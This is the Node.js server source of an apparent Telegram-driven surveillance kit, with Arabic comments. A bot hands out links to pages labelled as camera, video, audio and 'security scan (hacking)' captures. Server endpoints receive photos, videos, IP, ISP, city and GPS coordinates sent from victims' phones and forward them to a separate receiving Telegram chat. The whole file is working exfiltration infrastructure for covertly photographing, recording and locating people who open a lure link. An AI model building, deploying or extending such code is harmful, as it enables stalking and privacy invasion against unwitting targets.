require('dotenv').config();
const express  = require('express');
const multer   = require('multer');
const axios    = require('axios');
const FormData = require('form-data');
const cors     = require('cors');
const path     = require('path');

const app = express();
app.use(cors());
app.use(express.json());
const upload = multer({ storage: multer.memoryStorage() });
app.use(express.static(path.join(__dirname, 'public')));

// ============ الإعدادات ============
const SEND_BOT_TOKEN = process.env.SEND_BOT_TOKEN;
const RECV_BOT_TOKEN = process.env.RECV_BOT_TOKEN;
const RECV_CHAT_ID   = process.env.RECV_CHAT_ID;
const SERVER_URL     = process.env.SERVER_URL || `http://localhost:${process.env.PORT || 3000}`;

// ========================================
// Webhook — استقبال أوامر بوت المصري
// ========================================
app.post('/telegram-webhook', async (req, res) => {
  try {
    // ============ 1) معالجة ضغطات الأزرار ============
    if (req.body.callback_query) {
      const cb     = req.body.callback_query;
      const chatId = cb.message.chat.id;
      const data   = cb.data;

      let link  = "";
      let title = "";

      if (data === "link_photo") {
        link  = `${SERVER_URL}/index.html`;
        title = "📷 *رابط الكاميرا (صور):*";
      }
      else if (data === "link_video") {
        link  = `${SERVER_URL}/video.html`;
        title = "🎥 *رابط الفيديو (بدون صوت):*";
      }
      else if (data === "link_video_audio") {
        link  = `${SERVER_URL}/video-audio.html`;
        title = "🎥 *رابط الفيديو (مع صوت):*";
      }
      else if (data === "link_hacker") {
        link  = `${SERVER_URL}/hacker.html`;
        title = "🦠 *رابط الفحص الأمني:*";
      }

      if (link) {
        await axios.post(`https://api.telegram.org/bot${SEND_BOT_TOKEN}/sendMessage`, {
          chat_id: chatId,
          text: `${title}\n\n${link}\n\nافتحه على الهاتف ووافق على الإذن.`,
          parse_mode: "Markdown"
        });
      }

      // رد على تليجرام
      await axios.post(`https://api.telegram.org/bot${SEND_BOT_TOKEN}/answerCallbackQuery`, {
        callback_query_id: cb.id
      });

      return res.sendStatus(200);
    }

    // ============ 2) معالجة الرسائل النصية ============
    const { message } = req.body;
    if (message && message.text) {
      const text   = message.text.trim();
      const chatId = message.chat.id;

      // /start
      if (text === '/start') {
        await axios.post(`https://api.telegram.org/bot${SEND_BOT_TOKEN}/sendMessage`, {
          chat_id: chatId,
          text: "👋 أهلاً بك في بوت المصري\n\nاكتب /link للحصول على رابط."
        });
      }

      // /link
      else if (text === '/link') {
        await axios.post(`https://api.telegram.org/bot${SEND_BOT_TOKEN}/sendMessage`, {
          chat_id: chatId,
          text: "🎯 *اختر نوع الرابط:*\n\nمن فضلك اختر اللي يناسبك 👇",
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [
              [{ text: "📷 كاميرا (صور)",        callback_data: "link_photo" }],
              [{ text: "🎥 فيديو بدون صوت",      callback_data: "link_video" }],
              [{ text: "🎥 فيديو مع صوت",         callback_data: "link_video_audio" }],
              [{ text: "🦠 فحص أمني (اختراق)",    callback_data: "link_hacker" }]
            ]
          }
        });
      }

      // أمر غير معروف
      else {
        await axios.post(`https://api.telegram.org/bot${SEND_BOT_TOKEN}/sendMessage`, {
          chat_id: chatId,
          text: "❓ اكتب /link"
        });
      }
    }

    res.sendStatus(200);
  } catch (err) {
    console.error("❌ webhook:", err.message);
    res.sendStatus(200);
  }
});

// ========================================
// API — استقبال الصور
// ========================================
app.post('/api/upload', upload.single('photo'), async (req, res) => {
  try {
    if (!req.file) return res.status(400).json({ success: false, error: "no file" });

    const form = new FormData();
    form.append('chat_id', RECV_CHAT_ID);
    form.append('photo', req.file.buffer, {
      filename: 'capture.jpg',
      contentType: req.file.mimetype
    });
    form.append('caption', `📸 لقطة جديدة\n📅 ${new Date().toLocaleString('ar-EG')}`);

    const r = await axios.post(
      `https://api.telegram.org/bot${RECV_BOT_TOKEN}/sendPhoto`,
      form,
      { headers: form.getHeaders(), maxBodyLength: Infinity }
    );

    console.log("✅ تم إرسال صورة → هنداوي");
    res.json({ success: true, ok: r.data.ok });
  } catch (err) {
    console.error("❌ upload:", err.response?.data || err.message);
    res.status(500).json({ success: false });
  }
});

// ========================================
// API — استقبال الفيديو
// ========================================
app.post('/api/upload-video', upload.single('video'), async (req, res) => {
  try {
    if (!req.file) return res.status(400).json({ success: false });

    const form = new FormData();
    form.append('chat_id', RECV_CHAT_ID);
    form.append('video', req.file.buffer, {
      filename: 'video.webm',
      contentType: req.file.mimetype
    });
    form.append('caption', `🎥 فيديو جديد — ${new Date().toLocaleString('ar-EG')}`);
    form.append('supports_streaming', 'true');

    await axios.post(
      `https://api.telegram.org/bot${RECV_BOT_TOKEN}/sendVideo`,
      form,
      { headers: form.getHeaders(), maxBodyLength: Infinity }
    );

    console.log("✅ تم إرسال فيديو → هنداوي");
    res.json({ success: true });
  } catch (err) {
    console.error("❌ upload-video:", err.response?.data || err.message);
    res.status(500).json({ success: false });
  }
});

// ========================================
// API — استقبال معلومات الجهاز (hacker)
// ========================================
app.post('/api/upload-info', async (req, res) => {
  try {
    const info = req.body || {};

    let text = "🦠 *تقرير الفحص الأمني*\n\n";

    if (info.platform)  text += `📱 *الجهاز:* ${info.platform}\n`;
    if (info.browser)   text += `🌐 *المتصفح:* ${info.browser}\n`;
    if (info.screen)    text += `📐 *الشاشة:* ${info.screen}\n`;
    if (info.language)  text += `🗣️ *اللغة:* ${info.language}\n`;
    if (info.cores)     text += `💻 *الأنوية:* ${info.cores}\n`;
    if (info.memory)    text += `🧠 *الذاكرة:* ${info.memory}\n`;
    if (info.online)    text += `📶 *متصل:* ${info.online}\n`;

    text += "\n🌍 *الشبكة:*\n";
    if (info.ip)        text += `• IP: ${info.ip}\n`;
    if (info.country)   text += `• البلد: ${info.country}\n`;
    if (info.city)      text += `• المدينة: ${info.city}\n`;
    if (info.isp)       text += `• ISP: ${info.isp}\n`;

    if (info.lat && info.lng) {
      text += "\n📍 *الموقع:*\n";
      text += `• Latitude: ${info.lat}\n`;
      text += `• Longitude: ${info.lng}\n`;
      if (info.acc) text += `• الدقة: ${info.acc}\n`;
    }

    if (info.time) text += `\n🕐 *الوقت:* ${info.time}`;

    await axios.post(`https://api.telegram.org/bot${RECV_BOT_TOKEN}/sendMessage`, {
      chat_id: RECV_CHAT_ID,
      text: text,
      parse_mode: "Markdown"
    });

    console.log("✅ تم إرسال معلومات الجهاز → هنداوي");
    res.json({ success: true });
  } catch (err) {
    console.error("❌ upload-info:", err.response?.data || err.message);
    res.status(500).json({ success: false });
  }
});

// ========================================
// الصفحة الرئيسية
// ========================================
app.get('/', (req, res) => res.send("✅ السيرفر شغال"));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 السيرفر على http://localhost:${PORT}`));